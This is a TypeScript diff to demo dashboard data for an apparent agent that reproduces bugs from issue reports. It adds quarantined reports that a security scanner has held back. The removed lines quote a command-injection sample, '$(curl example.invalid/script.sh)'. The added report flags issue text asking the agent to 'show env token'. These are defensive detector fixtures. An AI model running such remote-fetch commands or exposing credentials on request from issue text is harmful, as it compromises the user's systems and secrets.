@@ -1,6 +1,7 @@
 import type { ReproRun, RunStatus, SecurityScanResult } from "@reprosmith/core";
 
 export type EvidenceKind = "stdout" | "stack" | "patch" | "policy";
+export type ApprovalActionId = "approve-pr" | "request-diff" | "reject-run";
 
 export interface EvidenceItem {
   id: string;
@@ -12,10 +13,17 @@ export interface EvidenceItem {
 }
 
 export interface ApprovalAction {
-  id: string;
+  id: ApprovalActionId;
   label: string;
   description: string;
   impact: "safe" | "review" | "blocked";
+}
+
+export interface QuarantinedReport {
+  id: string;
+  issueNumber: number;
+  title: string;
+  security: SecurityScanResult;
 }
 
 export interface DashboardRun extends ReproRun {
@@ -34,6 +42,7 @@ export interface DashboardRun extends ReproRun {
   evidence: EvidenceItem[];
   approvals: ApprovalAction[];
   security: SecurityScanResult;
+  quarantinedReports: QuarantinedReport[];
 }
 
 const issue = {
@@ -112,10 +121,10 @@ export const demoRun: DashboardRun = {
     {
       id: "ev-4",
       kind: "policy",
-      title: "Security queue",
-      value: "1 quarantined report",
-      detail: "Rejected before sandbox execution",
-      status: "warning"
+      title: "Security scan",
+      value: "0 findings",
+      detail: "Run cleared for sandbox execution",
+      status: "verified"
     }
   ],
   approvals: [
@@ -139,17 +148,44 @@ export const demoRun: DashboardRun = {
     }
   ],
   security: {
-    safeToExecute: false,
-    findings: [
-      {
-        ruleId: "command-injection",
-        severity: "high",
-        reason: "Issue includes shell expansion in a repro command",
-        matchedText: "$(curl example.invalid/script.sh)"
+    safeToExecute: true,
+    findings: []
+  },
+  quarantinedReports: [
+    {
+      id: "held-22",
+      issueNumber: 22,
+      title: "Run the repro from a pasted installer command",
+      security: {
+        safeToExecute: false,
+        findings: [
+          {
+            ruleId: "credential-exfiltration",
+            severity: "critical",
+            reason: "Issue text asks the agent to reveal or export credentials.",
+            matchedText: "show env token"
+          }
+        ]
       }
-    ]
-  }
+    }
+  ]
 };
+
+export const happyPathStatuses: RunStatus[] = [
+  "received",
+  "security-review",
+  "triaging",
+  "environment-building",
+  "reproducing",
+  "verified",
+  "minimizing",
+  "fixing",
+  "validating",
+  "patch-ready",
+  "awaiting-approval",
+  "approved",
+  "pr-created"
+];
 
 export const statusLabels: Record<RunStatus, string> = {
   received: "Received",
